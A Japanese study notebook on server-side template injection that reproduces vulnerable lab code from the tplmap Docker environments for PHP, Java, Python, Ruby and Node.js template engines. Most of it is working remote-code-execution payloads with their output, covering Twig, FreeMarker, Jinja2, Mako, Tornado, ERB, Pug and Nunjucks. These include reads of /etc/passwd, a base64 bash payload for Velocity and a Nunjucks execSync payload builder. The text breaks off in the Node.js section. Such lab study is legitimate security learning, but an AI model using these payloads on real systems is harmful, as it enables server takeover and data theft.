<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**

- [Server-Side Template Injection](#server-side-template-injection)
  - [概要](#%E6%A6%82%E8%A6%81)
  - [websitesVulnerableToSSTI](#websitesvulnerabletossti)
  - [tplmap (SSTI practice)](#tplmap-ssti-practice)
    - [setup](#setup)
    - [php](#php)
      - [eval](#eval)
      - [smarty](#smarty)
      - [twig](#twig)
    - [Java](#java)
      - [velocity](#velocity)
      - [freemarker](#freemarker)
    - [python](#python)
      - [eval](#eval-1)
      - [mako](#mako)
      - [jinja2](#jinja2)
      - [tornado](#tornado)
    - [Ruby](#ruby)
      - [eval](#eval-2)
      - [slim](#slim)
      - [erb](#erb)
    - [Node.js](#nodejs)
      - [jade (pug)](#jade-pug)
      - [nunjucks](#nunjucks)
      - [javascript (eval)](#javascript-eval)
      - [dot](#dot)
      - [dust](#dust)
      - [marko](#marko)
      - [ejs](#ejs)
- [writeup](#writeup)
  - [jinja2 render_template_string (ISC BugHunt101 CTF 2020)](#jinja2-render_template_string-isc-bughunt101-ctf-2020)
  - [erb / bypass 正規表現 "^" "$" (harkaze ctf 2017)](#erb--bypass-%E6%AD%A3%E8%A6%8F%E8%A1%A8%E7%8F%BE---harkaze-ctf-2017)
  - [jinja2 RCE through __class__.__mro__ (BSidesSF CTF 2017)](#jinja2-rce-through-__class____mro__-bsidessf-ctf-2017)
  - [Django str.format Information Disclosure (CODEGRAY CTF 2018)](#django-strformat-information-disclosure-codegray-ctf-2018)
  - [jinja2 / LFI / session['']に暗号化鍵で暗号化した値をセット (ASIS_CTF 2017 Golem)](#jinja2--lfi--session%E3%81%AB%E6%9A%97%E5%8F%B7%E5%8C%96%E9%8D%B5%E3%81%A7%E6%9A%97%E5%8F%B7%E5%8C%96%E3%81%97%E3%81%9F%E5%80%A4%E3%82%92%E3%82%BB%E3%83%83%E3%83%88-asis_ctf-2017-golem)
  - [Jinja2 bypass "." "_" / (Asis CTF Quals 2019)](#jinja2-bypass--_--asis-ctf-quals-2019)
  - [bottle / zip slip in tarFile (InterKosenCTF 2020 miniblog)](#bottle--zip-slip-in-tarfile-interkosenctf-2020-miniblog)
  - [tornado / obtain Cookie's secret_key (csictf 2020 The Usual Suspects)](#tornado--obtain-cookies-secret_key-csictf-2020-the-usual-suspects)
  - [sample](#sample)
  - [sample](#sample-1)
  - [sample](#sample-2)
  - [sample](#sample-3)
  - [Docker環境があるやつ(復習用)](#docker%E7%92%B0%E5%A2%83%E3%81%8C%E3%81%82%E3%82%8B%E3%82%84%E3%81%A4%E5%BE%A9%E7%BF%92%E7%94%A8)
    - [The Usual Suspects (csictf 2020)](#the-usual-suspects-csictf-2020)
    - [miniblog (InterKosenCTF 2020)](#miniblog-interkosenctf-2020)
- [メモ](#%E3%83%A1%E3%83%A2)
- [参考](#%E5%8F%82%E8%80%83)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# Server-Side Template Injection
## 概要
`<% %>`とかでViewの中に変数のデータを表示させたいときに、ユーザーの入力をそのTemplate構文の中に
入れるとRCEの脆弱性になるかもしれない。python,php,NodeJS,Ruby,Javaなど様々なTemplate構文においてその危険性がある。   
## websitesVulnerableToSSTI
https://github.com/DiogoMRSilva/websitesVulnerableToSSTI/blob/master/README.md   
以下のtplmapよりも多くのほぼすべてのテンプレートエンジンの環境があって、しかも`exploit.py`もついてる！！神！！   

## tplmap (SSTI practice)
https://github.com/epinna/tplmap   
SSTI検知ツールで、各テンプレートエンジンの脆弱な環境もDockerで用意されている。   
### setup
git cloneして、`docker-envs`ディレクトリ下で`docker-compose up -d`でコンテナを全部作成・起動する。   
```txt
docker@default:~$ docker ps
CONTAINER ID        IMAGE                             COMMAND                  CREATED             STATUS              PORTS                              NAMES
73a73451642d        docker-envs_tplmap_test_php       "docker-php-entrypoi…"   About an hour ago   Up About an hour    80/tcp, 0.0.0.0:15002->15002/tcp   docker-envs_tplmap_test_php_1
7d20e65fef72        docker-envs_tplmap_test_node      "/bin/sh -c 'cd /app…"   About an hour ago   Up About an hour    0.0.0.0:15004->15004/tcp           docker-envs_tplmap_test_node_1
ff18ec4758d6        docker-envs_tplmap_test_java      "/bin/sh -c 'cd env_…"   About an hour ago   Up About an hour    0.0.0.0:15003->15003/tcp           docker-envs_tplmap_test_java_1
d345416b4104        docker-envs_tplmap_test_python    "/bin/sh -c 'python …"   About an hour ago   Up About an hour    0.0.0.0:15001->15001/tcp           docker-envs_tplmap_test_python_1
f1a58c98075d        docker-envs_tplmap_test_python3   "/bin/sh -c 'python3…"   About an hour ago   Up About an hour    0.0.0.0:15006->15001/tcp           docker-envs_tplmap_test_python3_1
33eba77b5918        docker-envs_tplmap_test_ruby      "/bin/sh -c 'cd env_…"   About an hour ago   Up About an hour    0.0.0.0:15005->15005/tcp           docker-envs_tplmap_test_ruby_1
docker@default:~$
```
`http://192.168.99.100:15004/ejs?inj=a`とかでアクセスできる！   
### php
#### eval
`http://192.168.99.100:15002/eval.php?inj=*`   
![image](https://user-images.githubusercontent.com/56021519/102749953-453b1a00-43a8-11eb-903a-ebbf4ce70376.png)   
evalに`?inj=`の値がそのまま代入されている。   
```php
<?php

function generateRandomString($length = 10) {
    return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
}

$inj=$_GET["inj"];
if(isset($_GET["tpl"])) {
  // Keep the formatting a-la-python
  $tpl=str_replace("%s", $inj, $_GET["tpl"]);
}
else {
  $tpl=$inj;
}

if(!$_GET["blind"]) {
  echo generateRandomString();
  error_log('DEBUG< : ' . $tpl);
  $rendered = eval($tpl);
  error_log('DEBUG> : ' . $rendered);
  echo generateRandomString();
}
else {
  error_log('DEBUG< : ' . $tpl);
  ob_start();
  $rendered = eval($tpl);
  ob_end_clean();
  error_log('DEBUG> : ' . $rendered);
  echo generateRandomString();
}
?>
```
`http://192.168.99.100:15002/eval.php?inj=system(%27id%27);`でRCE！   
![image](https://user-images.githubusercontent.com/56021519/102750083-8e8b6980-43a8-11eb-843f-b4732c36e9f3.png)   
`tpl`の`%s`を`inj`パラメータの値に置き換えるので以下でRCE！   
`http://192.168.99.100:15002/eval.php?tpl=%25s&inj=system(%27id%27);`   
blindにすると`id`コマンドの実行結果は見えないが、確かに実行はされている！   
`http://192.168.99.100:15002/eval.php?tpl=%25s&inj=system(%27id%27);&blind=1`   
![image](https://user-images.githubusercontent.com/56021519/102750650-87b12680-43a9-11eb-8a7f-b37c06c988c8.png)   
`http://192.168.99.100:15002/eval.php?tpl=%25s&inj=aaa&blind=1`のようにevalの中でエラーが発生するようにすると、   
![image](https://user-images.githubusercontent.com/56021519/102750727-aadbd600-43a9-11eb-8e51-3fccd25f2ab6.png)   
#### smarty
`$smarty->fetch('string:'.$tpl);`で`?inj={*}`とすると、`$smarty->fetch('string:{*}');`となってこれがテンプレートエンジンによって解析される！ここが脆弱   
smarty-3.1.32-secured.php   
```php
<?php

function generateRandomString($length = 10) {
    return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
}

require('lib/smarty-3.1.29/libs/Smarty.class.php');
$smarty = new Smarty;

$inj=$_GET["inj"];
if(isset($_GET["tpl"])) {
  // Keep the formatting a-la-python
  $tpl=str_replace("%s", $inj, $_GET["tpl"]);
}
else {
  $tpl=$inj;
}

error_log('DEBUG< : ' . $tpl);
$rendered = $smarty->fetch('string:'.$tpl);
error_log('DEBUG> : ' . $rendered);

if(!$_GET["blind"]) {
  echo generateRandomString() . $rendered . generateRandomString();
}
else {
  echo generateRandomString();
}
?>
```
以下よりSmartyだと判定できるらしい。   
![image](https://user-images.githubusercontent.com/56021519/102763178-a836ac00-43bc-11eb-9a05-8f5af0aed0a7.png)   
```txt
http://192.168.99.100:15002/smarty-3.1.32-secured.php?inj=${7*7}
MOqmnDhLrj$49p5m8SkqDJo

http://192.168.99.100:15002/smarty-3.1.32-secured.php?inj=a{*comment*}b
ACWPmsrhdxabaJZ9dSrkm3
```
以下で環境変数とかを表示できる。`self::`のやつはなんかうまく行ってない。   

```txt
http://192.168.99.100:15002/smarty-3.1.32-secured.php?inj={$SCRIPT_NAME}
1uzWVrFehC/smarty-3.1.32-secured.phpG3rd1BP40c

http://192.168.99.100:15002/smarty-3.1.32-secured.php?inj={SMARTY_DIR}
urVZfizSOI/var/www/html/lib/smarty-3.1.32/libs/nOrJdf7o4h

http://192.168.99.100:15002/smarty-3.1.32-secured.php?inj={$smarty.get.inj}
JoeiKYCzW5{$smarty.get.inj}5O9topPlc1

GET /smarty-3.1.32-secured.php?inj={$smarty.cookies.a} 
Cookie: a=**cookie_value**
GBf6kdYhCJ**cookie_value**2HogA4LaUw

http://192.168.99.100:15002/smarty-3.1.32-unsecured.php?inj={self%3A%3AgetStreamVariable(%22file%3A%2F%2F%2Fproc%2Fself%2Floginuid%22)}%0D%0A
Fatal error: Uncaught --> Smarty Compiler: Syntax error in template "string:{self::getStreamVariable("file:///proc/s..." on line 1 "{self::getStreamVariable("file:///proc/self/loginuid")}" static class 'self' is undefined or not allowed by security setting <-- thrown in /var/www/html/lib/smarty-3.1.32/libs/sysplugins/smarty_internal_templatecompilerbase.php on line 1

http://192.168.99.100:15002/smarty-3.1.32-unsecured.php?inj={self::getStreamVariable($SCRIPT_NAME)}
Fatal error: Uncaught --> Smarty Compiler: Syntax error in template "string:{self::getStreamVariable($SCRIPT_NAME)}" on line 1 "{self::getStreamVariable($SCRIPT_NAME)}" static class 'self' is undefined or not allowed by security setting <-- thrown in /var/www/html/lib/smarty-3.1.32/libs/sysplugins/smarty_internal_templatecompilerbase.php on line 1
```
以下でRCEできてる！unsecured.phpでもsecured.phpでも両方同様にRCEできてる！   
```txt
http://192.168.99.100:15002/smarty-3.1.32-unsecured.php?inj={system(%27id%27)}
xdeFqDKjk3uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=33(www-data) gid=33(www-data) groups=33(www-data)wG31cLv75x

http://192.168.99.100:15002/smarty-3.1.32-secured.php?inj={%27****%27}
AksCy1ZQ8g****J5grndNk6e

http://192.168.99.100:15002/smarty-3.1.32-secured.php?inj={}
kXunBvWJh0{}wrFURs4H6f
```
#### twig
```php
<?php

function generateRandomString($length = 10) {
    return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
}

require_once './lib/Twig-1.24.1/lib/Twig/Autoloader.php';
Twig_Autoloader::register();

// Run render via CLI
if (php_sapi_name() == "cli") {
    $_GET["inj"] = '';
    $_GET["tpl"] = "";
} 

$inj=$_GET["inj"];
if(isset($_GET["tpl"])) {
  // Keep the formatting a-la-python
  $tpl=str_replace("%s", $inj, $_GET["tpl"]);
}
else {
  $tpl=$inj;
}

error_log('DEBUG: ' . $tpl);

$loader = new Twig_Loader_Array(array(
    'tpl' => $tpl,
));
$twig = new Twig_Environment($loader);

echo generateRandomString() . $twig->render('tpl') . generateRandomString();
 ?>
 ```
以下でTwigとわかる。   
```txt
http://192.168.99.100:15002/twig-1.19.0-unsecured.php?inj=*
Zrqshc5ipK*0ZtRqxO5nV

http://192.168.99.100:15002/twig-1.19.0-unsecured.php?inj=${7*7}
VqA0Fza9sE${7*7}fVCkzjUw3r

http://192.168.99.100:15002/twig-1.19.0-unsecured.php?inj={{7*7}}
eETDOLZaXq4948ghPHSBZC

http://192.168.99.100:15002/twig-1.19.0-unsecured.php?inj={{7*%277%27}}
KNXoxPeU3v49Tj3nD2FSaB
```
以下は全部うまく行ってないな…。   
```txt
http://192.168.99.100:15002/twig-1.19.0-unsecured.php?inj={{system(%27id%27)}}
Fatal error: Uncaught Twig_Error_Syntax: The function "system" does not exist in "tpl" at line 1 in /var/www/html/lib/Twig-1.19.0/lib/Twig/ExpressionParser.php:572 Stack trace: #0 /var/www/html/lib/Twig-1.19.0/lib/Twig/ExpressionParser.php(351): Twig_ExpressionParser->getFunctionNodeClass('system', 1) #1 /var/www/html/lib/Twig-1.19.0/lib/Twig/ExpressionParser.php(144): Twig_ExpressionParser->getFunctionNode('system', 1) #2 /var/www/html/lib/Twig-1.19.0/lib/Twig/ExpressionParser.php(84): Twig_ExpressionParser->parsePrimaryExpression() #3 /var/www/html/lib/Twig-1.19.0/lib/Twig/ExpressionParser.php(41): Twig_ExpressionParser->getPrimary() #4 /var/www/html/lib/Twig-1.19.0/lib/Twig/Parser.php(141): Twig_ExpressionParser->parseExpression() #5 /var/www/html/lib/Twig-1.19.0/lib/Twig/Parser.php(95): Twig_Parser->subparse(NULL, false) #6 /var/www/html/lib/Twig-1.19.0/lib/Twig/Environment.php(544): Twig_Parser->parse(Object(Twig_TokenStream)) #7 /var/www/html/lib/Twig-1.19.0/lib/Twig/Environment.php(596): Twig_Environment->parse(Obj in /var/www/html/lib/Twig-1.19.0/lib/Twig/ExpressionParser.php on line 572

http://192.168.99.100:15002/twig-1.19.0-unsecured.php?inj={{_self.env.registerUndefinedFilterCallback(%22exec%22)}}
bmlikECRBNJAUrW3Sm5k

http://192.168.99.100:15002/twig-1.19.0-unsecured.php?inj={{_self.env.getFilter(%22id%22)}}
UtRvAOJ2Ww2XWUpgIfMa

http://192.168.99.100:15002/twig-1.19.0-unsecured.php?inj={{_self.env.setCache(%22http://127.0.0.1:9500%22)}}
ouc3MNd81U9v7WqfaxuT
```
以下でRCEできたー！`eval`だとなんかダメだった。   
```txt
/twig-1.19.0-unsecured.php?inj={{_self.env.registerUndefinedFilterCallback(%22system%22)}}{{_self.env.getFilter(%22id%22)}}
fGNvg4mElu"uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=33(www-data) gid=33(www-data) groups=33(www-data)"2ioR6Zpqxg
```
### Java
#### velocity
`velocity.evaluate( context, w, "mystring", tpl );`の第4引数`tpl`にテンプレートを入力。   
```java
public static Object velocity(Request request, Response response) {


  // Get inj parameter, exit if none
  String inj = request.queryParams("inj");
  if(inj == null) {
    return "";
  }

  // Get tpl parameter
  String tpl = request.queryParams("tpl");
  if(tpl == null) {
    tpl = inj;
  }
  else {
    // Keep the formatting a-la-python
    tpl = tpl.replace("%s", inj);
  }
  
  String blind = request.queryParams("blind");

  LogChute velocityLogChute = new NullLogChute() ;
  VelocityEngine velocity;
  StringWriter w;
  try{
    velocity = new VelocityEngine() ;
    // Turn off logging - catch exceptions and log ourselves
    velocity.setProperty(RuntimeConstants.RUNTIME_LOG_LOGSYSTEM, velocityLogChute) ;
    velocity.setProperty(RuntimeConstants.INPUT_ENCODING, "UTF-8") ;
    velocity.init() ;

    VelocityContext context = new VelocityContext();
    w = new StringWriter();

    velocity.evaluate( context, w, "mystring", tpl );


  }catch(Exception e){
    e.printStackTrace();
    return "";
  }

  // Return out string if not blind
  if(blind == null){
    return UUID.randomUUID().toString() + w.toString() + UUID.randomUUID().toString();
  }
  else {
    return UUID.randomUUID().toString();
  }
}
```
以下だとどれも成功しないのでフローチャートに従えば`not vulnerable`となるが…。   
```txt
http://192.168.99.100:15003/velocity?inj=*
90c94e24-7577-4c67-8c3d-0375421243ee*d28b750b-7272-40db-a44c-1ee8036ce26f

http://192.168.99.100:15003/velocity?inj=${7*7}
d8337a02-26e6-4e13-844e-2183bb404981${7*7}a58f904b-a8f3-4962-96b4-6433624f1fc3

http://192.168.99.100:15003/velocity?inj={{7*7}}
c7afdf02-9829-4da6-ae80-fe2a914af8ae{{7*7}}3d299313-456d-40ca-b9bb-ccaf03f22db6
```
以下を送信するとSymantecが`Java Payload attack`を検出しちゃってDockerでは試せない…。   
```txt
192.168.99.100:15003/velocity?inj=$class.inspect("java.lang.Runtime").type.getRuntime().exec("sleep 5").waitFor()
```
以下でReverse shellできうるとからしい   
```python
payload ='''
#set($engine="")
#set($proc=$engine.getClass().forName("java.lang.Runtime").getRuntime().exec("bash -c {eval,$({tr,/+,_-}<<<%s|{base64,--decode})}"))
#set($null=$proc.waitFor())
${null}
'''%base64.b64encode("sleep 5")
```
#### freemarker
`template = new Template("name", new StringReader(tpl),  new Configuration());`で解析してる？？`StringReader()`の中にテンプレートを入れれば良さそう。   
```java
public static Object freemarker(Request request, Response response) {

  // Get inj parameter, exit if none
  String inj = request.queryParams("inj");
  if(inj == null) {
    return "";
  }

  // Get tpl parameter
  String tpl = request.queryParams("tpl");
  if(tpl == null) {
    tpl = inj;
  }
  else {
    // Keep the formatting a-la-python
    tpl = tpl.replace("%s", inj);
  }

  // Get blind parameter
  String blind = request.queryParams("blind");

  // Generate template from "inj"
  Template template;
  try{
    template = new Template("name", new StringReader(tpl),  new Configuration());
  }catch(IOException e){
    e.printStackTrace();
    return "";
  }

  // Write processed template to out
  HashMap data = new HashMap();
  StringWriter out = new StringWriter();
  try{
    template.process(data, out);
  }catch(TemplateException | IOException e){
    e.printStackTrace();
    return "";
  }

  // Return out string if not blind
  if(blind == null){
    return UUID.randomUUID().toString() + out.toString() + UUID.randomUUID().toString();
  }
  else {
    return UUID.randomUUID().toString();
  }
}
```
以下より、チャート的にはMakoということになるが…。   
```txt
http://192.168.99.100:15003/freemarker?inj=*
3f82c00c-5a47-4dc1-bf77-c7728cbfdf31*5d62471d-c8f5-42ae-8aec-49414b00d13a

http://192.168.99.100:15003/freemarker?inj=${7*7}
be77fc54-fc2a-4829-b3c9-9511bc760b92496f88d221-1075-4e11-bf87-af0237c95883

http://192.168.99.100:15003/freemarker?inj=aaaa{*comment*}bbb
0b768b56-f00c-49c8-930c-dd94878137f9aaaa{*comment*}bbba1fd270b-cdf0-451d-a1b2-e7bcc8e95395

http://192.168.99.100:15003/freemarker?inj=${%22z%22.join(%22ab%22)}
何も返ってこない
```
`<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }`以下でRCE！   
```txt
http://192.168.99.100:15003/freemarker?inj=%3C%23assign+ex%3D%22freemarker.template.utility.Execute%22%3Fnew%28%29%3E+%24%7B+ex%28%22id%22%29+%7D
e364a20a-dc6a-4ffe-9c3a-3a160d2f1a87 uid=0(root) gid=0(root) groups=0(root) 7820f0ba-f134-4991-bc75-2ad40f687839
```
### python
#### eval
```python
@app.route("/reflect/<engine>")
def reflect(engine):

    template = request.values.get('tpl')
    if not template:
        template = '%s'

    injection = request.values.get('inj')

    if engine == 'mako':
        return randomword() + MakoTemplates(template % injection, lookup=mylookup).render() + randomword()
    elif engine == 'jinja2':
        return randomword() + Jinja2Env.from_string(template % injection).render() + randomword()
    elif engine == 'eval':
        return randomword() + str(eval(template % injection)) + randomword()
    elif engine == 'tornado':
        return randomword() + tornado.template.Template(template % injection).generate() + randomword()
```
ここらへんはダメ。まあテンプレートエンジンで解析してるわけじゃないから当たり前だけど。   
```txt
http://192.168.99.100:15001/reflect/eval?inj=*
Internal Server Error

http://192.168.99.100:15001/reflect/eval?inj='***'
wkntaemr***sbfrnopf

http://192.168.99.100:15001/reflect/eval?inj=${7*7}
Internal Server Error

http://192.168.99.100:15001/reflect/eval?inj={{7*7}}
Internal Server Error
```
以下でRCEできる！参考は以下。まだ動くPayloadありそう？   
https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html   
```txt
http://192.168.99.100:15001/reflect/eval?inj=__import__(%27os%27).popen(%27id%27).read()
cezfkidwuid=0(root) gid=0(root) groups=0(root) govhugaq
```
#### mako
```python
    if engine == 'mako':
        return randomword() + MakoTemplates(template % injection, lookup=mylookup).render() + randomword()
```
以下より、Makoだと判定できる。   
```txt
http://192.168.99.100:15001/reflect/mako?inj=*
dfgmhedp*gtvdwfrn

http://192.168.99.100:15001/reflect/mako?inj=${7*7}
ezzrutbb49gjbioohx

http://192.168.99.100:15001/reflect/mako?inj=aaa{*comment*}bbb
zhkcggiiaaa{*comment*}bbbagrgkbii

http://192.168.99.100:15001/reflect/mako?inj=${%22*%22.join(%22___%22)}
nyagqhvz_*_*_cahscroa
```
RCEするには以下があるらしいが、これ無理では？   
```python
<%
import os
x=os.popen('id').read()
%>
${x}
```
以下とかで`${engine}`で`engine`変数の値が読めるかと思ったけどだめっぽい？   
```txt
http://192.168.99.100:15001/reflect/mako?inj={{%27%27.__class__.__mro__[2].__subclasses__()[40](%27/etc/passwd%27).read()%20}}
pueqjbpv{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}zqhejroz

http://192.168.99.100:15001/reflect/mako?inj=${engine}
Internal Server Error
```
以下でRCEできた！   
```txt
/reflect/mako?inj=${__import__(%22subprocess%22).check_output(%22id%22)}
gwxcpnysuid=0(root) gid=0(root) groups=0(root) sfondqyc
```
#### jinja2
```python
    elif engine == 'jinja2':
        return randomword() + Jinja2Env.from_string(template % injection).render() + randomword()
```
以下でJinja2と判定できる。   
```txt
http://192.168.99.100:15001/reflect/jinja2?inj=*
hzdrchlb*jbjleazb

http://192.168.99.100:15001/reflect/jinja2?inj=${7*7}
pirsuits${7*7}uxbbvhtz

http://192.168.99.100:15001/reflect/jinja2?inj={{7*7}}
cylhjspv49luxnnntk

http://192.168.99.100:15001/reflect/jinja2?inj={{7*%277%27}}
bvsjkzpq7777777bqoqcsnp
```
以下にいろいろ手法が書いてるけどなんかよくわからん…。   
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2   
大抵はInternal server errorになったけど以下だけは動いた   
```txt
http://192.168.99.100:15001/reflect/jinja2?inj={{%20%27%27.__class__.__mro__[2].__subclasses__()[40](%27/etc/passwd%27).read()%20}}
kumvedgwroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync......
```
以下でRCEできた！   
```txt
/reflect/jinja2?inj={{"".__class__.__mro__[2].__subclasses__()[59].__repr__.__globals__.items()[13][1]["__import__"]("subprocess").check_output("id")}}
egaepbsquid=0(root) gid=0(root) groups=0(root) ipsfpzzk
```
#### tornado
```python
    elif engine == 'tornado':
        return randomword() + tornado.template.Template(template % injection).generate() + randomword()
```
以下より、Jinja2と同じ感じに判定されてる？   
```txt
http://192.168.99.100:15001/reflect/tornado?inj=*
fplhzbeq*qtimtyxd

http://192.168.99.100:15001/reflect/tornado?inj=${7*7}
rccnmdzh${7*7}nxqxuufh

http://192.168.99.100:15001/reflect/tornado?inj={{7*7}}
wvsgtaah49oplxnfgy

http://192.168.99.100:15001/reflect/tornado?inj={{7*%277%27}}
sgpjyjjx7777777ozfenemu
```
以下でRCE!   
```txt
http://192.168.99.100:15001/reflect/tornado?inj={%import%20os%}{{os.popen(%22id%22).read()}}
rggolkqtuid=0(root) gid=0(root) groups=0(root) qtrhruyr
```
### Ruby
#### eval
```ruby
require "cuba"
require "cuba/safe"

require 'tilt'
require 'slim'
require 'erb'

Cuba.plugin Cuba::Safe

Cuba.define do
  on get do
    on "reflect/:engine" do |engine|
      # Keep the formatting a-la-python
      on param("inj"), param("tpl", "%s") do |inj, tpl|
        
        tpl = tpl.gsub('%s', inj)
        
        case engine
        when "eval"
          res.write eval(tpl)
        when "slim"

          template = Tilt['slim'].new() {|x| tpl}
          res.write template.render
        when "erb"
          template = Tilt['erb'].new() {|x| tpl}
          res.write template.render
        else
          res.write "#{engine} #{inj} #{tpl}" 
        end
        
      end
    end
```
`http://192.168.99.100:15005/reflect/eval?inj=*`で以下のようなエラー。   
![image](https://user-images.githubusercontent.com/56021519/102784834-44be7580-43e0-11eb-8bdb-fa8be136cf23.png)   
以下でRCEできる！systemを使うと実行自体はできているがTrueが返ってくる。バッククォートで挟めばシェルコマンドを実行できる！   
```txt
http://192.168.99.100:15005/reflect/eval?inj=system(%27id%27)
true

http://192.168.99.100:15005/reflect/eval?inj=`id`
uid=0(root) gid=0(root) groups=0(root) 
```
#### slim
```ruby
        when "slim"

          template = Tilt['slim'].new() {|x| tpl}
          res.write template.render
```
`http://192.168.99.100:15005/reflect/slim?inj=*`   
![image](https://user-images.githubusercontent.com/56021519/102785606-97e4f800-43e1-11eb-8732-2edc23383104.png)   
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby---basic-injections   
以下で空白が返る（応答なし）かエラーが返るかのどっちか。   
応答なしの場合は実行できてるってことか？？   
```txt
http://192.168.99.100:15005/reflect/slim?inj=#{File.open('/etc/passwd').read}
Slim::Parser::SyntaxError at /reflect/slim
Expected attribute (__TEMPLATE__), Line 1, Column 2 #{File.open('/etc/passwd').read} ^ 

http://192.168.99.100:15005/reflect/slim?inj=#{7*7}
空白

http://192.168.99.100:15005/reflect/slim?inj=#{system('cat%20/etc/passwd')}
Slim::Parser::SyntaxError at /reflect/slim
Expected attribute (__TEMPLATE__), Line 1, Column 2 #{system('cat%20/etc/passwd')} ^ 

http://192.168.99.100:15005/reflect/slim?inj=#{ %x|env| }
空白

http://192.168.99.100:15005/reflect/slim?inj=%23{`wget%20http://127.0.0.1:9500`}
Slim::Parser::SyntaxError at /reflect/slim
Expected attribute (__TEMPLATE__), Line 1, Column 8 #{`wget http://127.0.0.1:9500`} ^ 

http://192.168.99.100:15005/reflect/slim?inj=%23{`id`}
空白

http://192.168.99.100:15005/reflect/slim?inj=%23{Dir.entries(%27/%27)}
Slim::Parser::SyntaxError at /reflect/slim
Expected attribute (__TEMPLATE__), Line 1, Column 2 #{Dir.entries('/')} ^ 
```
https://github.com/DiogoMRSilva/websitesVulnerableToSSTI/blob/master/ruby/Slim/exploit.py   
によれば以下で行けるらしいけどInternal server errorがでてうまく行ってない…   
```python
#this exploit returns true if successful
payload='#{system( "touch attackerFile" )}'
payload='#{%x( ls )}'
```
#### erb
```ruby
        when "erb"
          template = Tilt['erb'].new() {|x| tpl}
          res.write template.render
```
以下でRCEとかできてる！URL encodeしないと`%`とかうまく機能しないのでそこはやる。   
```txt
http://192.168.99.100:15005/reflect/erb?inj=<%= 7 * 7 %>
49

http://192.168.99.100:15005/reflect/erb?inj=<%= File.open('/etc/passwd').read %>
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync 

http://192.168.99.100:15005/reflect/erb?inj=<%= `id` %>
uid=0(root) gid=0(root) groups=0(root) 
```
### Node.js
#### jade (pug)
```js
var connect = require('connect');
var http = require('http');
var url = require('url');
var pug = require('pug');
var nunjucks = require('nunjucks');
var dust = require('dustjs-linkedin');
var dusthelpers = require('dustjs-helpers');
var randomstring = require("randomstring");
var doT=require('dot');
var marko=require('marko');
var ejs=require('ejs');

var app = connect();

// Pug
app.use('/pug', function(req, res){
  if(req.url) {
    var url_parts = url.parse(req.url, true);

    var inj = url_parts.query.inj;
    var tpl = '';
    if('tpl' in url_parts.query && url_parts.query.tpl != '') {
      // Keep the formatting a-la-python
      tpl = url_parts.query.tpl.replace('%s', inj);
    }
    else {
      tpl = inj;
    }
    res.end(randomstring.generate() + pug.render(tpl) + randomstring.generate());
  }
});
```
`http://192.168.99.100:15004/pug?inj=*`   
![image](https://user-images.githubusercontent.com/56021519/102789503-974f6000-43e7-11eb-975f-4e6a907eaa26.png)   
以下でRCE！   
```txt
http://192.168.99.100:15004/pug?inj=%23{root.process.exec(%27id%27)}
TypeError: root.process.exec is not a function on line 1

http://192.168.99.100:15004/pug?inj=%23{root.process.mainModule.require(%27child_process%27).spawnSync(%27cat%27,%20[%27/etc/passwd%27]).stdout}
DWaaj1zol8AOye03vUgKQe45bjwYIJPp<root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin

http://192.168.99.100:15004/pug?inj=%23{root.process.mainModule.require(%27child_process%27).spawnSync(%27id%27).stdout}
f57THclTZCppfq15t6gWfVgGe7rgq4CJ<uid=0(root) gid=0(root) groups=0(root)
></uid=0(root) gid=0(root) groups=0(root)
>6O6QVxEh23H9q3McNQDhzd0hqOWBIVq9
```
#### nunjucks
```js
// Nunjucks
app.use('/nunjucks', function(req, res){
  if(req.url) {
    var url_parts = url.parse(req.url, true);

    var inj = url_parts.query.inj;
    var tpl = '';
    if('tpl' in url_parts.query) {
      // Keep the formatting a-la-python
      tpl = url_parts.query.tpl.replace('%s', inj);
    }
    else {
      tpl = inj;
    }
    res.end(randomstring.generate() + nunjucks.renderString(tpl) + randomstring.generate());
  }
});
```
よくわからん。   
```txt
http://192.168.99.100:15004/nunjucks?inj=***
TEDkpYm4gpNPPsw3mspMMDxnAMePvcSD***oPMmVEt3Hhwv7cz30d8cpdXdhrvdMD4o
```
以下のpython2スクリプトで`id`コマンドを実行できるRCE！   
```python
import base64

command_to_execute = "id"
code_to_execute = "global.process.mainModule.require('child_process').execSync('%s').toString()"%command_to_execute
code_b64_Encoded =base64.b64encode( code_to_execute )
jscode = '''range.constructor("return eval(Buffer('%s','base64').toString())")()'''%code_b64_Encoded
payload ='''{{%s}}'''%jscode

# /nunjucks?inj={{range.constructor("return eval(Buffer('Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5yZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlY1N5bmMoJ2lkJykudG9TdHJpbmcoKQ==','base64').toString())")()}}
# kktOA7zUUCZz6Jhf7k8abZ0kC6sGTXwpuid=0(root) gid=0(root) groups=0(root)
